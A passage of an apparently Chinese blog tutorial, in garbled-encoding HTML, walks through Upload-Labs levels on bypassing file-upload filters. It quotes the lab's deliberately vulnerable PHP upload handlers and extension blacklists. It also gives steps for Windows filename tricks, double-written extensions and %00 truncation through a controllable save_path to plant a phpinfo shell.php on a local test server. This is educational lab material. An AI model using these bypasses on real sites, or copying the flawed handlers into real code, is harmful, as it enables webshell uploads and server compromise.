id="10-æ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­"><a href="#10-æ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­" class="headerlink" title="10. æ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­"></a>10. æ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼â€ã€‚</li></ul><h4 id="11-ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨"><a href="#11-ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨" class="headerlink" title="11. ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨"></a>11. ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœä¸Šä¼ ç›®å½•<code>UPLOAD_PATH</code>ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œè¯·æ‰‹å·¥åˆ›å»ºï¼â€ã€‚</li></ul><h2 id="2-5-11-åˆ©ç”¨-windows-ç¯å¢ƒçš„å åŠ ç‰¹å¾ç»•è¿‡ä¸Šä¼ "><a href="#2-5-11-åˆ©ç”¨-windows-ç¯å¢ƒçš„å åŠ ç‰¹å¾ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.11 åˆ©ç”¨ windows ç¯å¢ƒçš„å åŠ ç‰¹å¾ç»•è¿‡ä¸Šä¼ "></a>2.5.11 åˆ©ç”¨ windows ç¯å¢ƒçš„å åŠ ç‰¹å¾ç»•è¿‡ä¸Šä¼ </h2><h3 id="æ–¹æ³•-1"><a href="#æ–¹æ³•-1" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><p>é¦–å…ˆæŠ“åŒ…ä¸Šä¼  a.php:.jpgï¼ˆphpæ–‡ä»¶ï¼‰ ä¸Šä¼ ä¼šåœ¨ç›®å½•é‡Œç”Ÿæˆ a.php ç©ºç™½æ–‡ä»¶ï¼Œæ¥ç€å†æ¬¡æäº¤æŠŠa.php æ”¹æˆ a.&gt;&gt;&gt;</p><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ windwos ä¸­å¦‚æœä¸Šä¼ æ–‡ä»¶å moonsec.php:.jpg çš„æ—¶å€™ï¼Œä¼šåœ¨ç›®å½•ä¸‹ç”Ÿäº§ç©ºç™½çš„æ–‡ä»¶å moonsec.php</p><p>å†åˆ©ç”¨ php å’Œ windows ç¯å¢ƒçš„å åŠ å±æ€§ï¼Œ</p><p>ä»¥ä¸‹ç¬¦å·åœ¨æ­£åˆ™åŒ¹é…æ—¶ç›¸ç­‰</p><p>åŒå¼•å·â€ ç­‰äº ç‚¹å·.</p><p>å¤§äºç¬¦å·&gt; ç­‰äº é—®å·?</p><p>å°äºç¬¦å·&lt; ç­‰äº æ˜Ÿå·*</p><p>æ–‡ä»¶å.&lt;æˆ–æ–‡ä»¶å.&lt;&lt;&lt;æˆ–æ–‡ä»¶å.&gt;&gt;&gt;æˆ–æ–‡ä»¶å.&gt;&gt;&lt;ç©ºæ–‡ä»¶å</p><h3 id="ä»£ç åˆ†æ-2"><a href="#ä»£ç åˆ†æ-2" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>pass-10<br>åŒæ ·æ˜¯é»‘åå•åŒ¹é…ï¼ŒæŠŠ.å»æ‰ï¼Œå¤§å°å†™è¿‡æ»¤ï¼Œ æŠŠç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ã€‚::$data ä¹Ÿè¿‡æ»¤äº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-12-åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ "><a href="#2-5-12-åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.12 åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ "></a>2.5.12 åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ </h2><h3 id="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><p>æŠ“åŒ…ä¸Šä¼ ï¼ŒæŠŠåç¼€åæ”¹æˆ pphphp å³å¯ç»•è¿‡ä¸Šä¼ </p><h3 id="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ åŸç†"><a href="#åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ åŸç†"></a>åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ åŸç†</h3><p>åœ¨ä¸Šä¼ æ¨¡å—ï¼Œæœ‰çš„ä»£ç ä¼šæŠŠé»‘åå•çš„åç¼€åæ›¿æ¢æˆç©ºï¼Œä¾‹å¦‚ a.php ä¼šæŠŠ php æ›¿æ¢æˆç©ºï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ä¾‹å¦‚ asasppï¼Œpphphpï¼Œå³å¯ç»•è¿‡ä¸Šä¼ ã€‚</p><h3 id="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>åŒå†™åç¼€åç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>åŒæ ·æ˜¯é»‘åå•è¿‡æ»¤ã€‚str_ireplace å¯¹ä¸Šä¼ çš„åç¼€åæ˜¯é»‘åå•å†…çš„å­—ç¬¦ä¸²è½¬æ¢æˆç©ºã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-13-ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ "><a href="#2-5-13-ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.13 ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ "></a>2.5.13 ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ </h2><p>å¦‚æœé»‘åå•ä¸Šä¼ æ£€æµ‹åï¼Œæ²¡æœ‰é™å®šåç¼€åï¼Œç»•è¿‡çš„æ–¹æ³•å¾ˆå¤šï¼Œä¸é»‘åå•ç›¸å¯¹çš„å°±æ˜¯ç™½åå•ï¼Œä½¿ç”¨ç™½åå•éªŒè¯ä¼šç›¸å¯¹æ¯”è¾ƒå®‰å…¨ï¼Œå› ä¸ºåªå…è®¸æŒ‡å®šçš„æ–‡ä»¶åç¼€åã€‚ä½†æ˜¯å¦‚æœæœ‰å¯æ§çš„å‚æ•°ç›®å½•ï¼Œä¹Ÿå­˜åœ¨è¢«ç»•è¿‡çš„é£é™©ã€‚</p><h3 id="ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><p>ä¸Šä¼ å‚æ•°å¯æ§</p><ul><li>å½“ gpc å…³é—­çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨%00 å¯¹ç›®å½•æˆ–è€…æ–‡ä»¶åè¿›è¡Œæˆªæ–­ã€‚</li><li>php ç‰ˆæœ¬å°äº 5.3.4</li></ul><p>é¦–å…ˆæˆªæ–­æ”»å‡»ï¼ŒæŠ“åŒ…ä¸Šä¼ å°†%00 è‡ªåŠ¨æˆªæ–­åé—¨å†…å®¹ã€‚</p><p>ä¾‹å¦‚ 1.php%00      1.php å˜æˆ 1.phpO</p><p>ä¸Šä¼ jpgæ–‡ä»¶ï¼Œ</p><p>åœ¨ Upload-Labs ç¬¬ 12 å…³ä¸­ï¼Œä½ éœ€è¦ä¸Šä¼ ä¸€ä¸ª <strong>JPG æ–‡ä»¶</strong>ï¼Œä½†é€šè¿‡æ¼æ´ç»•è¿‡æ–‡ä»¶ç±»å‹é™åˆ¶ï¼Œä½¿å…¶è¢«æœåŠ¡å™¨è§£æä¸º PHP æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†è§£é‡Šå’Œæ“ä½œæ­¥éª¤ï¼š</p><h3 id="ä¸ºä»€ä¹ˆä¸Šä¼ -JPG-æ–‡ä»¶ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä¸Šä¼ -JPG-æ–‡ä»¶ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¸Šä¼  JPG æ–‡ä»¶ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä¸Šä¼  JPG æ–‡ä»¶ï¼Ÿ</h3><ol><li><strong>ç»•è¿‡æ–‡ä»¶ç±»å‹é™åˆ¶</strong>ï¼šè¯¥å…³å¡çš„ä»£ç é€šå¸¸ä¼šæ£€æŸ¥æ–‡ä»¶æ‰©å±•åï¼Œåªå…è®¸ä¸Šä¼ ç‰¹å®šçš„å›¾ç‰‡æ ¼å¼ï¼ˆå¦‚ JPGã€PNG ç­‰ï¼‰ï¼Œè€Œé˜»æ­¢ä¸Šä¼  PHP æ–‡ä»¶ã€‚</li><li><strong>åˆ©ç”¨ <code>%00</code> æˆªæ–­æ¼æ´</strong>ï¼šé€šè¿‡åœ¨æ–‡ä»¶åä¸­æ’å…¥ <code>%00</code>ï¼ˆNULL å­—ç¬¦ï¼‰ï¼Œå¯ä»¥æˆªæ–­æ–‡ä»¶åçš„æ‰©å±•åï¼Œä»è€Œç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æŸ¥ã€‚</li></ol><h3 id="æ“ä½œæ­¥éª¤"><a href="#æ“ä½œæ­¥éª¤" class="headerlink" title="æ“ä½œæ­¥éª¤"></a>æ“ä½œæ­¥éª¤</h3><h4 id="1-å‡†å¤‡æ–‡ä»¶"><a href="#1-å‡†å¤‡æ–‡ä»¶" class="headerlink" title="1. å‡†å¤‡æ–‡ä»¶"></a>1. å‡†å¤‡æ–‡ä»¶</h4><ul><li>åˆ›å»ºä¸€ä¸ªåŒ…å« PHP ä»£ç çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>shell.php</code>ï¼Œå†…å®¹å¯ä»¥æ˜¯ï¼š<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>å°†æ–‡ä»¶æ‰©å±•åæ”¹ä¸º <code>.jpg</code>ï¼Œä¾‹å¦‚ <code>shell.jpg</code>ã€‚è¿™æ ·æ–‡ä»¶çœ‹èµ·æ¥æ˜¯ä¸€ä¸ª JPG æ–‡ä»¶ï¼Œä½†å®é™…ä¸Šå†…å®¹æ˜¯ PHP ä»£ç ã€‚</li></ul><h4 id="2-æŠ“åŒ…å¹¶ä¿®æ”¹è¯·æ±‚"><a href="#2-æŠ“åŒ…å¹¶ä¿®æ”¹è¯·æ±‚" class="headerlink" title="2. æŠ“åŒ…å¹¶ä¿®æ”¹è¯·æ±‚"></a>2. æŠ“åŒ…å¹¶ä¿®æ”¹è¯·æ±‚</h4><ul><li>ä½¿ç”¨ Burp Suite æˆ–å…¶ä»–æŠ“åŒ…å·¥å…·æ‹¦æˆªä¸Šä¼ è¯·æ±‚ã€‚</li><li>åœ¨è¯·æ±‚ä¸­æ‰¾åˆ°æ–‡ä»¶åå­—æ®µï¼ˆé€šå¸¸æ˜¯ <code>filename</code> æˆ–ç±»ä¼¼å­—æ®µï¼‰ï¼Œå°†å…¶å€¼æ”¹ä¸º <code>shell.jpg%00</code>ã€‚</li><li>ç¡®ä¿æ–‡ä»¶å†…å®¹æ˜¯ PHP ä»£ç ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„ JPG å›¾ç‰‡å†…å®¹ã€‚</li></ul><h4 id="3-ä¿®æ”¹ä¿å­˜è·¯å¾„"><a href="#3-ä¿®æ”¹ä¿å­˜è·¯å¾„" class="headerlink" title="3. ä¿®æ”¹ä¿å­˜è·¯å¾„"></a>3. ä¿®æ”¹ä¿å­˜è·¯å¾„</h4><ul><li>åœ¨æŠ“åŒ…çš„è¯·æ±‚ä¸­ï¼Œæ‰¾åˆ° <code>save_path</code> å‚æ•°ï¼ˆæˆ–ç±»ä¼¼å‚æ•°ï¼‰ï¼Œå°†å…¶å€¼æ”¹ä¸º <code>../upload/shell.php%00</code>ã€‚</li><li>è¿™é‡Œçš„ <code>%00</code> æ˜¯å…³é”®ï¼Œå®ƒä¼šåœ¨æ–‡ä»¶ä¿å­˜æ—¶è¢«æˆªæ–­ï¼Œæœ€ç»ˆä¿å­˜ä¸º <code>shell.php</code>ã€‚</li></ul><h4 id="4-ä¸Šä¼ å¹¶éªŒè¯"><a href="#4-ä¸Šä¼ å¹¶éªŒè¯" class="headerlink" title="4. ä¸Šä¼ å¹¶éªŒè¯"></a>4. ä¸Šä¼ å¹¶éªŒè¯</h4><ul><li>å‘é€ä¿®æ”¹åçš„è¯·æ±‚ï¼Œä¸Šä¼ æ–‡ä»¶ã€‚</li><li>è®¿é—® <code>http://127.0.0.1/upload/shell.php</code>ï¼Œå¦‚æœæˆåŠŸæ‰§è¡Œäº† PHP ä»£ç ï¼ˆå¦‚æ˜¾ç¤º <code>phpinfo()</code> çš„å†…å®¹ï¼‰ï¼Œåˆ™è¯´æ˜æ”»å‡»æˆåŠŸã€‚</li></ul><h3 id="å…³é”®ç‚¹æ€»ç»“"><a href="#å…³é”®ç‚¹æ€»ç»“" class="headerlink" title="å…³é”®ç‚¹æ€»ç»“"></a>å…³é”®ç‚¹æ€»ç»“</h3><ul><li><strong>æ–‡ä»¶ç±»å‹</strong>ï¼šä¸Šä¼ çš„æ˜¯ <code>.jpg</code> æ–‡ä»¶ï¼Œä½†å†…å®¹æ˜¯ PHP ä»£ç ã€‚</li><li><strong>æ–‡ä»¶åæˆªæ–­</strong>ï¼šé€šè¿‡åœ¨æ–‡ä»¶åä¸­æ·»åŠ  <code>%00</code>ï¼Œç»•è¿‡æ–‡ä»¶æ‰©å±•åé™åˆ¶ã€‚</li><li><strong>ä¿å­˜è·¯å¾„</strong>ï¼šé€šè¿‡ä¿®æ”¹ä¿å­˜è·¯å¾„ï¼Œç¡®ä¿æ–‡ä»¶è¢«ä¿å­˜ä¸º <code>.php</code> æ–‡ä»¶ã€‚</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>ç¡®ä¿ PHP ç‰ˆæœ¬ä½äº 5.3.4ï¼Œå› ä¸º <code>%00</code> æˆªæ–­æ¼æ´åœ¨æ›´é«˜ç‰ˆæœ¬ä¸­å¯èƒ½æ— æ•ˆã€‚</li><li>å¦‚æœæœåŠ¡å™¨å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº† MIME ç±»å‹æ£€æŸ¥ï¼Œå¯èƒ½éœ€è¦åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ ä¸€äº› JPG æ–‡ä»¶çš„ç‰¹å¾å­—èŠ‚ï¼ˆå¦‚ <code>FFD8</code>ï¼‰ï¼Œä½†é€šå¸¸è¿™ç§æ£€æŸ¥åœ¨ Upload-Labs ä¸­ä¸ä¼šå¤ªä¸¥æ ¼ã€‚</li></ul><p>å¸Œæœ›è¿™äº›ä¿¡æ¯å¯¹ä½ æœ‰å¸®åŠ©ï¼</p><h3 id="ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ åŸç†"></a>ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ åŸç†</h3><ul><li><p>è¯¥å…³å¡çš„ä»£ç é€šè¿‡ <code>$_GET[&#39;save_path&#39;]</code> æ‹¼æ¥æ–‡ä»¶è·¯å¾„ï¼Œå¹¶ä½¿ç”¨ <code>move_uploaded_file</code> å‡½æ•°ä¿å­˜æ–‡ä»¶ã€‚</p></li><li><p>å½“ PHP ç‰ˆæœ¬å°äº 5.3.4 ä¸” <code>magic_quotes_gpc</code> å…³é—­æ—¶ï¼Œ<code>%00</code> ä¼šè¢«è§£æä¸ºå­—ç¬¦ä¸²ç»ˆæ­¢ç¬¦ï¼Œå¯¼è‡´æ–‡ä»¶åæˆªæ–­ã€‚</p></li><li><p>é€šè¿‡åœ¨æ–‡ä»¶åä¸­æ·»åŠ  <code>%00</code>ï¼Œå¯ä»¥ç»•è¿‡æ–‡ä»¶æ‰©å±•åçš„ç™½åå•é™åˆ¶ã€‚</p></li></ul><h3 id="ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#ç›®å½•å¯æ§-00-æˆªæ–­ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>ç›®å½•å¯æ§%00 æˆªæ–­ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>ä»£ç ä¸­ä½¿ç”¨ç™½åå•é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶åç¼€åï¼Œåªå…è®¸æŒ‡å®šçš„å›¾ç‰‡æ ¼å¼ã€‚ä½†æ˜¯$ _GET[â€˜save_pathâ€™]æœåŠ¡å™¨æ¥å—å®¢æˆ·ç«¯çš„å€¼ï¼Œè¿™ä¸ªå€¼å¯è¢«å®¢æˆ·ç«¯ä¿®æ”¹ã€‚æ‰€ä»¥ä¼šç•™ä¸‹å®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span 